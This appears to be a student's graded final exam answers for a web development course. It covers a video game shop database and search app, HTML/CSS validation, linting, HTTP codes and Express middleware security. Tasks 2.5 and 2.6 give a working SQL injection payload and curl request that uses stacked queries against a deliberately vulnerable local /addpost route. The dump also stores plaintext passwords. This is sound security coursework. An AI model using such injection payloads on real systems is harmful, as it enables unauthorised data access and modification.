

# Final Exam 2021 S1 WDC


# Part 1

You have been hired to design a web application for an online shop that sells video games.

The system requires the following features:

- Users can search the different video games available
- Video games can be searched/filtered by:
  - Genre/Category
  - Platform (console/PC etc.)
  - Features
  - Price
- Users can sign-up and log-in
- Users can order video games
- Users can view their order history

 

Thinking about such a system, complete the following tasks:

## Task 1.1


Design a database schema diagram for the system described.

- Be sure to include appropriate relationships and cardinalities.
- Be sure to normalise the schema to at least 3rd normal form.

 

Upload the file as an image or pdf

25/30

---



![wdc-final-preparation-Page-3-1](https://minio.llycloud.com/image/uPic/image-20210706QZZGHQ.png) 



## Task 1.2

When building a database schema, N-N relationships need to be properly reduced/decomposed.

Briefly discuss how this applies to the system you've designed in Task 1.1 and, specifically in terms of your system and its relationships, explain how this relates to database normalisation.

10/10

---



In the database scheme attached above, there is N-N relationships between user table and game table which connected by join table -- order table. 

Based on the N-N relationship by join table, there are several 1-N relationships to construct the N-N relationship. 

The first one is between user table and order table in order to create a reference relationship (order.user_id match user.user_id) to represent the one user could order multiple games 

The second one is between game table and order table in order to create a reference relationship (game.game_id match order.game_id) to represent the one game could be purchased by multiple games as the different order ids depends on different purchase timestamp.

 Based on above two 1-N relationship with foreign key implementation, there is a join table order has been constructed. As the principal of foregin kay which is a key used to link two tables together. 

Based on 1st normal form, the the address of user divided into user_address table, the platform and category of game are divided into sub tables. 

Based on 2nd normal form,when a composite key is used (a primary key consisting of multiple attributes), the other attributesshould relate to all parts of the key. The attributes of every table on the diagram above are related to primary key. 

Based on 3rd normal form, every columns are not reference other colums that aren's keys. The references only appear on foreign key connected to primary key. 



## Task 1.3

Implement your database schema from Task 1.1 in MySQL

When you create the database

- Ensure appropriate tables, data types, keys and integrity constraints are present.
- Add at least 1 row of test data to each table.

30/30

---

```sql
-- MySQL dump 10.13  Distrib 8.0.25, for Linux (x86_64)
--
-- Host: 127.0.0.1    Database: wdc-final
-- ------------------------------------------------------
-- Server version	8.0.19-0ubuntu5

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


--
-- Current Database: `wdc-final`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `wdc-final` /*!40100 DEFAULT CHARACTER SET utf8 */;

USE `wdc-final`;

--
-- Table structure for table `category`
--

DROP TABLE IF EXISTS `category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `category` (
  `category_id` int NOT NULL AUTO_INCREMENT,
  `category_name` varchar(255) NOT NULL,
  `category_description` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`category_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category`
--

LOCK TABLES `category` WRITE;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
INSERT INTO `category` VALUES (1,'Action games','Action games desc'),(2,'Action-adventure games','Action-adventure games desc'),(3,'Adventure games','Adventure games desc'),(4,'Role-playing games','Role-playing games desc'),(5,'Simulation games','Simulation games desc'),(6,'Strategy games','Strategy games desc');
/*!40000 ALTER TABLE `category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `game`
--

DROP TABLE IF EXISTS `game`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `game` (
  `game_id` int NOT NULL AUTO_INCREMENT,
  `game_name` varchar(255) NOT NULL,
  `category` int DEFAULT NULL,
  `platform` int DEFAULT NULL,
  `features` varchar(255) DEFAULT NULL,
  `price` double(13,2) DEFAULT NULL,
  PRIMARY KEY (`game_id`),
  KEY `game_platform_platform_id_fk` (`platform`),
  KEY `game_category_category_id_fk` (`category`),
  CONSTRAINT `game_category_category_id_fk` FOREIGN KEY (`category`) REFERENCES `category` (`category_id`),
  CONSTRAINT `game_platform_platform_id_fk` FOREIGN KEY (`platform`) REFERENCES `platform` (`platform_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `game`
--

LOCK TABLES `game` WRITE;
/*!40000 ALTER TABLE `game` DISABLE KEYS */;
INSERT INTO `game` VALUES (1,'game_01',1,1,'featrues_1',25.56),(2,'game_02',2,2,'featrues_2',35.66),(3,'game_03',3,3,'featrues_3',14.50),(4,'game_04',4,4,'featrues_4',27.77),(5,'game_05',5,5,'featrues_5',40.99),(6,'game_06',6,1,'featrues_6',19.99);
/*!40000 ALTER TABLE `game` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order`
--

DROP TABLE IF EXISTS `order`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `order` (
  `user_id` int DEFAULT NULL,
  `game_id` int DEFAULT NULL,
  `order_id` int NOT NULL AUTO_INCREMENT,
  `purchase_timestamp` datetime DEFAULT NULL,
  PRIMARY KEY (`order_id`),
  KEY `order_user_user_id_fk` (`user_id`),
  KEY `order_game_game_id_fk` (`game_id`),
  CONSTRAINT `order_game_game_id_fk` FOREIGN KEY (`game_id`) REFERENCES `game` (`game_id`),
  CONSTRAINT `order_user_user_id_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order`
--

LOCK TABLES `order` WRITE;
/*!40000 ALTER TABLE `order` DISABLE KEYS */;
INSERT INTO `order` VALUES (1,2,1,'2021-06-30 13:23:51'),(5,4,6,'2021-06-19 13:23:51'),(6,1,7,'2021-06-17 13:23:51'),(4,4,8,'2021-06-21 13:23:51'),(5,1,9,'2021-06-20 13:23:51'),(4,6,10,'2021-04-30 13:23:51'),(5,2,11,'2021-06-22 13:23:51'),(4,1,12,'2021-05-30 13:23:51'),(1,6,13,'2021-04-25 13:23:51'),(7,6,14,'2020-04-25 13:23:51');
/*!40000 ALTER TABLE `order` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `platform`
--

DROP TABLE IF EXISTS `platform`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `platform` (
  `platform_id` int NOT NULL AUTO_INCREMENT,
  `platform_name` varchar(255) NOT NULL,
  `platform_description` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`platform_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `platform`
--

LOCK TABLES `platform` WRITE;
/*!40000 ALTER TABLE `platform` DISABLE KEYS */;
INSERT INTO `platform` VALUES (1,'console','console_platform'),(2,'PC','PC_platform'),(3,'Mac','Mac_platform'),(4,'IOS','IOS_platform'),(5,'Android','android_platform');
/*!40000 ALTER TABLE `platform` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user` (
  `user_id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `email_address` varchar(255) DEFAULT NULL,
  `address` int DEFAULT NULL,
  `phone_number` int NOT NULL,
  `create_by` varchar(255) DEFAULT NULL,
  `create_time` date DEFAULT NULL,
  `update_by` varchar(255) DEFAULT NULL,
  `update_time` date DEFAULT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `user_phone_number_uindex` (`phone_number`),
  UNIQUE KEY `user_username_uindex` (`username`),
  UNIQUE KEY `user_email_address_uindex` (`email_address`),
  KEY `user_user_address_address_id_fk` (`address`),
  CONSTRAINT `user_user_address_address_id_fk` FOREIGN KEY (`address`) REFERENCES `user_address` (`address_id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (1,'Akide_Liu','IAMpassword','mail@llycloud.com',1,450460666,'Admin','2021-06-16','Admin','2021-06-16'),(4,'Akide_Liu1','IAMpassword','mail1@llycloud.com',1,450460661,'Admin','2021-06-16','Admin','2021-06-16'),(5,'Akide_Liu2','IAMpassword','mail2@llycloud.com',1,450460662,'Admin','2021-06-16','Admin','2021-06-16'),(6,'Akide_Liu3','IAMpassword','mail3@llycloud.com',1,450460663,'Admin','2021-06-16','Admin','2021-06-16'),(7,'Akide_Liu4','IAMpassword','mail4@llycloud.com',1,450460664,'Admin','2021-06-16','Admin','2021-06-16');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_address`
--

DROP TABLE IF EXISTS `user_address`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_address` (
  `address_id` int NOT NULL AUTO_INCREMENT,
  `street_address` varchar(1024) NOT NULL,
  `suburb_town` varchar(255) NOT NULL,
  `state` varchar(255) NOT NULL,
  `country` varchar(255) NOT NULL,
  `postCode` varchar(20) NOT NULL,
  PRIMARY KEY (`address_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_address`
--

LOCK TABLES `user_address` WRITE;
/*!40000 ALTER TABLE `user_address` DISABLE KEYS */;
INSERT INTO `user_address` VALUES (1,'421 King William St','Adelaide','SA','AU','5000');
/*!40000 ALTER TABLE `user_address` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-06-30 18:59:56

```



## Task 1.4

8/10

```sql
select username,email_address
from user
inner join `order` o on user.user_id = o.user_id
inner join game g on o.game_id = g.game_id
where o.order_id IN (
    select order_id
    from `order` as ino
    WHERE DATEDIFF(NOW(), ino.purchase_timestamp) < 90
)
and g.game_name like '%game_02%'
GROUP BY user.user_id
;

```

## Task 1.5

Implement a basic web application for the search feature of this online shop.

- Use only the technologies covered in this course:
  - HTML & CSS
  - JavaScript, AJAX, & basic client-side Vue.js
  - NodeJS/Express
  - MySQL
- Only implement the search page/feature and any necessary supporting code on the server.
- Users should also be able to filter search results by:
  - Genre/Category
  - Platform (console/PC etc.)
  - Features
  - Price
- Be sure to follow best practices as discussed throughout the course.

 

Excluding the node_modules folder, submit/upload your implementation as a zip file

160/160

## Task 1.6

[Steam](https://store.steampowered.com/) is an example of an online shop that sells video games.

Identify a feature present in both the Steam website, and your implementation from Task 1.5.

Specifically in terms of operability and understandability, discuss how these two systems compare.

15/15

---



Compare my implementation to `https://store.steampowered.com/`, we both implementation the search system which adapted possibility for end user easily access / filter the required game by category, platform, features, price.

For operability, based on Cognitive load that Cognitive load describes the amount of thought/mental work required to complete a given task.

steam and my workaround both implement that conditional filters which helps user to easy find required games.

There is difference that stream used the draggle bar for price filter, and my workout required user manually input the start price and end price in order to filter the price range. The draggle bar is more convenient and less instructions required for end user. In another word, draggle bar descended the input error possibility compare to input bar.

Furthermore, for the platform and categories filter and search, steam provide a list of common selection for end user which reduce the complexity for user to remember the type of game required to input.

1. Affordance
   1. both implementation make the actions that users want to take easily accessible and readily perceivable.
   2. both implementation use `search` symbol that clearly reflect the meaning of search operation.
2. Consistency
   1. both implementation use consistent style / layout. Which stream use blue as the base color, and my search used green as base color.
   2. both implementation in relation to other parts of the site or other site. store clearly use header and navigation for user quick access the other pages. As we just required to implement login part, the navigation is easily adapted with the further requirements.
3. simplicity
   1. Avoid clutter, both implementation modularized the components including search bar, condition area and result display area.
4. Choice of words
   1. Both implementation use words that match the user's goals, clearly the search and condition input are clearly defined the functionality for allocated input area and button. The table title also clearly show the purpose of required data

So, for improvement of my implementation, i would consider the replace the input bar to selection bar which list the common type of categories or platform for end user. And also keep the input functionality in place for advanced search.

For the understandability, kinematic load describes the amount of physical work required to complete a given task.

1. Proximity
   1. Both implementation have related objects close to each other, for instance, the steam have more search conditions than my implementation, these conditions bars are mainly located at right side of website. in my implementation, these search conditions are close to search bar.
   2. positioning objects that are likely to be used together far away from each other creates extra effort to interact with them. Both site are well constructed, which are separate the different functional area to different functionality. for example, display areas are used to display results
2. Layers
   1. Avoid hiding controls multiple layers/menus/dialogs/pages deep. For my implementation there are only on layer hidden right side of search bottom which is a switch for different conditional search.
   2. Keep frequently used controls always available. In fact, my implementation default select `and search` condition for most commonly using conditions, and stream also provides a lot of default value.

Based on the Fitt's law, both implementation are shared the same properties that :

- Larger controls are easier to interact with
- closer controls are easier to interact with
- controls close to screen edges are easier to interact with.

Steam and my implementation used different and conspicuous color and design to outline the search dialog. And the search button with word `search`. we both provide the filter conditions of category, platform, features, price.

Both of steam and my workaround, every button has been properly labeled and every input bar/ select bar/ draggle bar have the completed instructions for what options will this area worked for.

For display result, the steam do not have table head to point at the purpose of search results. My implementation have a table title to classify the purpose of research results which makes user's more easily to understand the search results.



## Task 2.1

The files provided contain a number of HTML & CSS validation errors

Identify the validation errors and in terms of those specific errors discuss the benefits and disadvantages of how modern web browsers handle invalid HTML & CSS.

12/15

---



```sql
vnu --also-check-css $(find ./ | grep -v 'node_modules' | egrep '.html|.css' | sed -r 's/\/\//\//g') 

"file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/index.html":30.13-30.18: error: End tag “div” seen, but there were open elements.
"file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/index.html":27.17-27.20: error: Unclosed element “h2”.
"file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/stylesheets/style.css":77.1-77.4: error: CSS: Parse Error.
```

Css HTML validator can increase the website's quality score by helping find and fix broken links, broken redirects, and misspelled words.

Validating with css html validator helps to make the website more accessible.

The core reason to run your html document through a conformance checker is simple : to catch unintended mistakes.

 Benefits :

The browser will base works when there are micro mistake of most based tag misspelled or not closed (div tag ,p tag, span tag). Even the html / css is not valid, the browser will try best to display content to minimize the impact of end user. But, this rule is not working for advanced html tag or css style, for example, a invalid img tag will result the image could not load properly.

Disadvantages :

With the rapid technology growth, the modern browser might be able to tolerate more tags and invalid tags or style. There is a good approach for reduce the impact to the end user. However, when modern browsers handle more invalid html/css. The developers will not pay much attention to the issues of html/css error and do not realize the importance of valid html. Without properly linting and validation, lots of micro erros will produce huge bad effort which directly reduce the accessibility of the web application. So that we need validation all of html/css document before these files moved into production which could minimize the predicable impact to end user.

## Task 2.2

The provided index.js JavaScript file in the routes folder also contain a number of linting errors for the linting rules used in this course.

Identify the linting errors and in terms of those specific errors discuss the role that linting plays in the development of error-free code.

10/15

---



```sql
eslint $(find ./ -name '*.js'| grep -v 'node_modules' | sed -r 's/\/\//\//g')

/home/ubuntu/final/exam_part2/routes/index.js
  12:7   warning  Unexpected console statement    no-console
  49:32  error    Use '===' to compare with null  no-eq-null
  50:34  error    Use '===' to compare with null  no-eq-null
  57:15  warning  Unexpected console statement    no-console
  64:21  warning  Unexpected console statement    no-console
  72:21  error    'tag' is not defined            no-undef
  73:34  error    'tag' is not defined            no-undef
  73:59  error    Missing semicolon               semi
  81:25  warning  Unexpected console statement    no-console

/home/ubuntu/final/exam_part2/routes/users.js
  18:59  error  Parsing error: Unexpected token function

/home/ubuntu/final/exam_part2/app.js
   43:11  warning  Unexpected console statement  no-console
  105:13  warning  Unexpected console statement  no-console

✖ 12 problems (6 errors, 6 warnings)
  1 error and 0 warnings potentially fixable with the `--fix` option.
```

Just notice that there is a issue could not be able to fix : 

```shell
/Users/akide/IdeaProjects/WDC/Final/exam_part2/routes/us
19:59 error Parsing error: Unexpected token function
✖ 1 problem (1 error, 0 warnings)
```

This issue is related to enlist setting which is not configure by provided enlist file, which i would provide following references :

 https://piazza.com/class/kirbdk29i9y65q?cid=612

 https://stackoverflow.com/a/53883984/14207562

 https://github.com/eslint/eslint/issues/8366#issuecomment-326776306 

As the javascript is a dynamic and loosely-typed language, is especially prone to developer error. Without the benefit of a compilation process, javascript code is typically executed in order to find syntax or other errors. linting tools like ESLint allow developers to discover problems with their JavaScript code without executing it. 

## Task 2.3

Specifically using examples from this Part 2 web application, explain the purpose and role of HTTP status codes in web systems.

13/15

---



The http status code played in the role which let frontend to understand the status of server's response. for instance, 2xx class codes refer success responses. 4xx class codes refer client erros, 5xx class code rfer server errors. When client side js receive the different https status code, they can determine the is the response success or not, if the response failed, client side js could react the properly action to notify end user based on different type of error -- client side error or server side error. 

```js
res.end(); //send response
```

normally, the res.send() and res.end(), res.json() will send result to frontend via http protocol. 2xx class responsed code which refer successful response is the most common code we could seen in the http transmission, especially code 200. 

```js
res.sendStatus(400);
```

The 400 http status code refer the bad request which means the server do not understand the request due to invalid syntax. Based on the code, these 400 codes most often have produced by client side did not provided required data (this may be request body or request parameters or request query). The server could not react without client side send the proper request data. 

```js
res.sendStatus(401);
```

The 401 http status code refers that unauthorized or unauthenticated which means client must authenticate itslef to get the requested response. Based on the code, these 401 codes most often have been produced by client side login credentials is not accepted by server or when user request protected resources, the client do not have enough layer authority or under to provide authentication exchange identifier (e.g. session, jwt). 

```sql
res.sendStatus(500);
```

The 500 https status code refers the server has encountered a situation it doest't know how to handle. Based on the code, these 500 codes most often have been produced by server side issues such as the connection to database is unreachable, or the query is not able to execute. in other words, these issues always related server side misconfigurations, code issues, unreliable/unreachable integration services (mysql database) or maybe the server has been hacked by attack. Therefore could not able to produce correct compture to retrieve data as user requested. 

## Task2.4

Discuss the role that middleware plays in the security of this web application and identify any issues with the way that the middleware in this web application is implemented.

8/20

**What we were looking for:**

- You've discussed the role of middleware in the security of this web app specifically.
- You've identified the issue with one of the routes that allows the middleware to be skipped for that route.

---



The middleware played the role for web security in nodejs ecosystem. The middleware could place in front of real production route which provide functionality. For example, we could use `helmet` middleware to prevent http header vulnerabilities and place `express-brute` to rate limit the authorization end point and `express-html-sanitizer` for prevent xss attack.

In this application, there is a session middleware which used to give the authorization identifier for authenticate user.

First, the secret of session `secret` is hard coded into `app.js`. There is a improvement to use random secret `crypto.randomBytes(16).toString('hex')`

Second, as the session is cookie based by `express-session` implementation, so the consideration to secure the session cookie is required.

For instance

1. give a `sameSite` attribute blocks the ability to send a cookie in a cross-origin request. This provide protection against CSRF attacks.
2. give a `httpOnly` attribute blocks the ability to use the document.cookie object. This prevents XSS attacks from stealing the session identifier.
3. give `secure: true`  attribute will set cookies over HTTPS only
4. give a `max-age` to expire the cookie (auto logout)
5. use helmet `nocache` lib for supercharge the http header security related to Session security

Final configuration :

```jsx
const noCache = require('nocache');
app.use(noCache());

app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave:false,
    saveUninitialized:true,
    cookie: {
        httpOnly:true,
        secure:false,// Due to development purpose, should be enable in production environment (https required)
				sameSite:true,
        maxAge: 600000
    },
}));
```

There are a few research for how to secure the node.js web application by middleware:

[Security Best Practices for Express in Production](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)

- [Use TLS](https://expressjs.com/en/advanced/best-practice-security.html#use-tls)

  Transport layer security could secure the connection and data.

  We could use `https` package to identify itself using the certificate and to force clients to connect over TLS

  [Securely Connecting Express and Node.js Using Mutual TLS - Smallstep](https://smallstep.com/hello-mtls/doc/combined/express/nodejs)

  basics setup :

  ```
  const fs = require('fs');
  const https = require('https');
  const express = require('express');
  
  const app = express();
  
  app.get('/', (req, res) => {
    return res.send('Hello, world!');
  });
  
  https
    .createServer(
      {
        // ...
        cert: fs.readFileSync('server.crt'),
        key: fs.readFileSync('server.key'),
        // ...
      },
      app
    )
    .listen(9443);
  ```

- [Use Helmet](https://expressjs.com/en/advanced/best-practice-security.html#use-helmet)

  Helmet can help protect your app from some well-known web vulnerabilities by setting HTTP headers appropriately.

  ```
  var helmet = require('helmet')
  app.use(helmet())
  app.disable('x-powered-by')
  ```

- [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)

  use `cookie-session` middleware the configure the change the default session cookie name and secure the cookies

  ```
  var session = require('express-session')
  app.set('trust proxy', 1) // trust first proxy
  app.use(session({
    secret: 's3Cur3',
    name: 'sessionId'
  }))
  ```

  Then configure the cookie security options

  ```
  var session = require('cookie-session')
  var express = require('express')
  var app = express()
  
  var expiryDate = new Date(Date.now() + 60 * 60 * 1000) // 1 hour
  app.use(session({
    name: 'session',
    keys: ['key1', 'key2'],
    cookie: {
      secure: true,
      httpOnly: true,
      domain: 'example.com',
      path: 'foo/bar',
      expires: expiryDate
    }
  }))
  ```

- [Prevent brute-force attacks against authorization](https://expressjs.com/en/advanced/best-practice-security.html#prevent-brute-force-attacks-against-authorization)

  We could user `express-brute` middleware to limit the rate for client request login or authentication api endpoint.

  ```
  const ExpressBrute = require('express-brute');
  const store = new ExpressBrute.MemoryStore();
  const bruteforce = new ExpressBrute(store);
  
  app.post('/login',
    bruteforce.prevent,
    (req, res, next) => {
      res.send('Success!');
    }
  );
  ```

  Then when an attack hits the route too often, then the attacker will get a 429 response indicating the route has been hit too many times from the same origin.

  [Node.js Best Practices - Improving Security](https://medium.com/swlh/node-js-best-practices-improving-security-2c772419d475)

## Task 2.5

This web application contains a SQL injection vulnerability. 

Identify the vulnerability and explain the consequences of SQL injection in terms of this vulnerability.

20/20

---



Investigation flow :

1. Looking for which query did not use proper preparation statement Then we found following code contains vulnerability from `/addpost` endpoint in `index.js`

   ```jsx
   let tags = '';
                   for(const tag of req.body.tags){
                       tags += `('${tag}',LAST_INSERT_ID()),`;
                   }
                   tags = tags.replace(/,$/,'');
                   var query = 'INSERT INTO question_tags (tagname,question) VALUES '+tags+';';
   ```

2. After analysis this code, the main issues is the `tag` variable used string concatenation, and `tag` is from `req.body.tags`

3. Then we could looking into sql and try to concatenation a SQL injection example query shows below :

   ```sql
   INSERT INTO questions (author,title,content,timestamp) VALUES (1,'12345','123455',NOW());
   INSERT INTO question_tags (tagname, question)
   VALUES ('123',LAST_INSERT_ID());
           INSERT INTO question_tags (tagname, question)
           VALUES ((select version()), LAST_INSERT_ID());
       -- -', LAST_INSERT_ID())；
   ```

4. In the above SQL, i put a `'` after 123 then replace `,LAST_INSERT_ID());` to make this query end of execution. After that there are any additional attack query cloud be insert into database. so i choice add one more tag which contains database system version, finally use `-- -'` annotation to ignore original statement.

5. Based on get `/posts` endpoint will display the information for `q_tags.tags` from database, so that we could view our injection by webpage.

   ```sql
   var query = `SELECT  q_tags.tags,
                             users.given_name AS author,
                             questions.title,
                             questions.content,
                             questions.timestamp,
                             questions.q_id,
                             IFNULL(q_up.tally,0) AS upvotes
                     FROM questions INNER JOIN users ON questions.author = users.u_id
                     LEFT JOIN q_tags ON q_tags.question = questions.q_id
                     LEFT JOIN q_up ON q_up.question = questions.q_id;`;
   ```

![Untitled(6)](https://minio.llycloud.com/image/uPic/image-20210716aYoA65.png)

## Task 2.6

Using the vulnerability identified in 2.5, use Insomnia to craft and test an exploit that does one of the following:

- Modifies data in the database without authorisation
- Reveals data from the database without authorisation

 Use the Copy as Curl option to copy the request for this exploit and paste it in the box below:

25/30

---



```bash
curl --request POST \
  --url http://localhost:3000/addpost \
  --header 'Content-Type: application/json' \
  --cookie connect.sid=s%253A2JPRmUjDzgPkfxRb2Y0aOA-eDjESSZ7Y.YNBtrnuAUmFO6l6Bt4BkbBo1jJ1KijIpvVk%252BlTbWD2o \
  --data '{
	"title":"test",
	"content":"test",
	"tags":["test'\'',LAST_INSERT_ID());INSERT INTO question_tags (tagname, question)VALUES ((select version()), LAST_INSERT_ID());-- -"],
	"upvotes":0}'
```



## Task 2.7

Using the list below, fix the issues and make the improvements identified.

- Fix the validation and linting issues identified in 2.1 & 2.2.
- Fix any issues with the middleware in this web application as identified in 2.4.
- Fix the SQL injection vulnerability identified in 2.5.

 Excluding the node-modules folder, submit/upload the fixed/improved web applicaiton as a zip file

[80 marks]
Consisting of

- 20 marks for validation and linting issues fixed
- 30 marks for middleware issues fixed
- 30 marks for SQL injection issues fixed

57.25/80

---

## Exam Notes & Feedback

![img](./2021-07-16_02-54-11.png)
